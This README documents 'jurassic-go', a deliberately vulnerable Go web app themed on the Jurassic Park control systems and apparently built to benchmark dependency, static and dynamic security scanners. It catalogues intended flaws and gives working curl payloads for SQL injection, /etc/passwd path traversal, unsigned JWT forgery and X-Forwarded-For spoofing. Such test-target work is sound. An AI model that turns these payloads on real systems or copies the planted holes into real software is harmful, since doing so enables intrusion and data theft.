# 🦖 `jurassic-go` — Jurassic Park System

> *"Spared no expense"* — except on dependency upgrades, authentication, and input validation.

`jurassic-go` is a small, deliberately vulnerable Go web app modeled on the **Jurassic Park System** from the 1993 film: the Visitor Center kiosk, the control room's Irix terminal (Nedryland, "System Security Interface, Version 4.0.5, Alpha"), Dennis Nedry's `whte_rbt.obj`, the security grid, main power, the animal census, embryo cold storage, and the FSN file browser ("It's a UNIX system!").

It is a test target for four detection layers:

| Layer | What should detect it |
| :--- | :--- |
| **SCA** | Dependency scanning of `go.mod`, the compiled binary (`.go.buildinfo`), and the Go standard library |
| **Rule-based SAST** | Opengrep / Semgrep rules (single file, pattern based) |
| **AI SAST only** | Semantic and business-logic analysis — rule-based SAST misses these |
| **ASM / Red Agent** | Web crawling and dynamic probing of the running app |

> [!WARNING]
> Do not deploy this app on a network you care about. Every weakness is intentional.

---

## Park systems and endpoints

| Park system | Route | In `/swagger.json`? | Found in | Auth |
| :--- | :--- | :---: | :--- | :--- |
| Visitor Center kiosk | `GET /` | — | crawler seed | public |
| Control room (Irix terminal) | `GET /control-room` | — | link on `/`, `robots.txt` | public |
| Park status + Earthwatch weather | `GET /api/v1/park/status` | ✅ | Swagger, `visitor-kiosk.js` | public |
| Tour vehicles (Ford Explorers on the electric track) | `GET /api/v1/tour/vehicles` | ✅ | Swagger, `visitor-kiosk.js` | public |
| Animal census (paddock motion sensors) | `GET /api/v1/animals/census?species=` | ✅ | Swagger, `visitor-kiosk.js` | public |
| Visitor tour pass (JWT) | `POST /api/v1/visitors/pass`, `GET /api/v1/visitors/me` | ✅ | Swagger, `visitor-kiosk.js` | public / tour pass |
| Personnel roster | `GET /api/v1/system/personnel` | ❌ | `/static/visitor-kiosk.js` | **any** Bearer token |
| Incident reports | `GET /api/v1/system/incidents`, `GET /api/v1/system/incidents/:id` | ❌ | `/static/visitor-kiosk.js` | tour pass |
| FSN file browser | `GET /api/v1/system/fsn?path=` | ❌ | `/static/jpss-console.js` | none |
| Embryo cold storage | `GET /api/v1/system/cold-storage` | ❌ | `/static/jpss-console.js` | none |
| Main power (maintenance shed) | `POST /api/v1/system/power` | ❌ | `/static/jpss-console.js` | spoofable IP check |
| Security grid (`whte_rbt.obj`) | `POST /api/v1/system/security-grid` | ❌ | `/static/jpss-console.js` | **any** Bearer token |
| Central Park Control Console | `POST /api/v1/system/command` | ❌ | `/static/jpss-console.js` | magic word |

Console commands (`POST /api/v1/system/command`): `tour initiate`, `system raptors`, `whte_rbt.obj`, `access security`, `access security grid`, `access main security grid`, `safety -o`, `keychecks -o`. After `whte_rbt.obj`, the `access ...` commands return *"AH AH AH! YOU DIDN'T SAY THE MAGIC WORD!"* until you send the magic word.

Data for the census and the incident reports is in an embedded in-memory **SQLite** database (`modernc.org/sqlite`, pure Go), so the SQL injection and IDOR are exploitable without external services.

---

## Implemented issues and expected findings

| CVE | CWE | Severity | Package / park system | Code usage | Expected detection |
| :--- | :--- | :--- | :--- | :--- | :--- |
| **CVE-2020-26160** | CWE-287, CWE-347 | HIGH | `github.com/dgrijalva/jwt-go` v3.2.0+incompatible — tour pass | `jwt.NewWithClaims`, `jwt.Parse` called | **SCA** |
| **CVE-2022-28948** | CWE-400, CWE-502 | HIGH | `gopkg.in/yaml.v3` v3.0.0-20210107192922 — security grid | `yaml.Unmarshal` on the request body | **SCA** |
| **CVE-2020-28483**, **CVE-2023-29401**, **CVE-2023-26125** | CWE-20, CWE-434 | HIGH / MEDIUM | `github.com/gin-gonic/gin` v1.6.3 | HTTP router | **SCA** |
| **CVE-2021-42576**, **CVE-2021-29272** | CWE-79 | HIGH / MEDIUM | `github.com/microcosm-cc/bluemonday` v1.0.4 | Blank import `_` only; `Sanitize()` never called | **SCA** (unreachable by call graph) |
| **CVE-2024-45337**, **CVE-2023-48795** (+ other `ssh` CVEs) | CWE-287, CWE-354, CWE-400 | CRITICAL / HIGH | `golang.org/x/crypto` 2020-07-09 — personnel hashes | Only `bcrypt` used; `ssh` never imported | **SCA** (module-level scanners); pruned by package-level scanners |
| **CVE-2021-38561**, **CVE-2022-32149** | CWE-787, CWE-400 | HIGH | `golang.org/x/text` v0.3.3 — census tags | Only `transform` used; `language` never imported | **SCA** (module-level); pruned by package-level |
| **CVE-2026-63209** | CWE-190 | HIGH | `github.com/klauspost/compress` v1.9.5 — cold storage telemetry | Only `zstd` used; `s2` never imported | **SCA** (module-level) |
| **CVE-2020-27813**, **GHSA-w67g-5rqw-f597** | CWE-190 | HIGH / MEDIUM | `github.com/gorilla/websocket` v1.4.0 | Only in `go.mod`; never imported | **SCA** on `go.mod`; absent from the compiled binary |
| Go stdlib CVEs (e.g. **CVE-2025-22871**) | CWE-444, CWE-295, CWE-400 | CRITICAL / HIGH | Go 1.21 (`golang:1.21-alpine`) | Compiled into `/app/jurassic-go` | **SCA** on the container image only |
| — | **CWE-89** SQL injection | HIGH | Animal census | `fmt.Sprintf` into `QueryContext` with the `species` query parameter | **Rule-based SAST**, Red Agent |
| — | **CWE-22** path traversal | MEDIUM | FSN file browser | `os.ReadFile` on the `path` query parameter | **Rule-based SAST**, Red Agent |
| — | **CWE-327** JWT `none` algorithm | MEDIUM | Tour pass | `jwt.UnsafeAllowNoneSignatureType` accepted in `parseTourPass` | **Rule-based SAST**, Red Agent |
| — | **CWE-327** insecure TLS | HIGH | Cold storage → Site B telemetry | `tls.Config{MinVersion: tls.VersionTLS10, InsecureSkipVerify: true}` | **Rule-based SAST** |
| — | **CWE-319**, **CWE-400** | MEDIUM | HTTP server | `http.ListenAndServe` without TLS or timeouts | **Rule-based SAST** |
| — | **CWE-306** missing authentication | MEDIUM / HIGH | Cold storage, FSN, console | Gin routes registered without auth middleware | **Rule-based SAST** (Gin rule — also flags public routes), Red Agent |
| — | **CWE-287 / CWE-290** auth bypass | CRITICAL | Personnel, security grid | `arbitraryBearerAuthMiddleware` checks the `Bearer ` prefix but never verifies the token | **AI SAST only**, Red Agent |
| — | **CWE-290** spoofing | CRITICAL | Main power | `getMaintenanceShedClientIP` trusts the leftmost `X-Forwarded-For` value for the `10.19.93.0/24` allowlist | **AI SAST only**, Red Agent |
| — | **CWE-639** IDOR | HIGH | Incident reports | `/incidents/:id` uses a parameterized query but omits the `visitor_account_id` filter that the list endpoint has | **AI SAST only**, Red Agent |
| — | **CWE-798** hard-coded credentials | CRITICAL | JWT signing key, magic word | `getJWTSecret()` and `getMagicWord()` fall back to constants | **AI SAST only** |
| — | **CWE-1059**, **CWE-200** shadow API | MEDIUM | All `/api/v1/system/*` routes | Missing from `/swagger.json`; only in the JS bundles | **ASM / Red Agent crawler** |

---

## Run and verify

```bash
CGO_ENABLED=0 go build -mod=mod -o jurassic-go . && ./jurassic-go
# or: docker build -t jurassic-go . && docker run -p 8080:8080 jurassic-go

B=http://localhost:8080

# SQL injection in the animal census (CWE-89)
curl -s -G "$B/api/v1/animals/census" \
  --data-urlencode "species=zzz' UNION SELECT id, title, settlement, location, 0, 0, details FROM incidents--"

# Tour pass, then IDOR on another visitor's incident (CWE-639)
TP=$(curl -s -X POST $B/api/v1/visitors/pass -H 'Content-Type: application/json' -d '{"visitor_name":"Dr. Alan Grant"}' | jq -r .tour_pass)
curl -s $B/api/v1/system/incidents -H "Authorization: Bearer $TP"     # only Grant's incident
curl -s $B/api/v1/system/incidents/6 -H "Authorization: Bearer $TP"   # Biosyn embryo theft

# Unsigned "none" tour pass (CWE-327)
H=$(printf '%s' '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
P=$(printf '%s' '{"sub":"Hammond","account_id":99}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
curl -s $B/api/v1/visitors/me -H "Authorization: Bearer $H.$P."

# Any Bearer token works (CWE-287)
curl -s $B/api/v1/system/personnel -H 'Authorization: Bearer literally-anything'

# FSN path traversal (CWE-22)
curl -s "$B/api/v1/system/fsn?path=/etc/passwd"

# Main power via a spoofed X-Forwarded-For (CWE-290)
curl -s -X POST $B/api/v1/system/power -H 'X-Forwarded-For: 10.19.93.7' -H 'Content-Type: application/json' -d '{"action":"off"}'

# Nedry's terminal
curl -s -X POST $B/api/v1/system/command -H 'Content-Type: application/json' -d '{"command":"whte_rbt.obj"}'
curl -s -X POST $B/api/v1/system/command -H 'Content-Type: application/json' -d '{"command":"access main security grid"}'
curl -s -X POST $B/api/v1/system/command -H 'Content-Type: application/json' -d '{"command":"access main security grid","magic_word":"please"}'

# Security grid override with a YAML payload (yaml.v3)
curl -s -X POST $B/api/v1/system/security-grid -H 'Authorization: Bearer nedry' \
  --data-binary $'command: whte_rbt.obj\nsuspend_user_access: true\ndisable_fences:\n  - velociraptor\n'
```
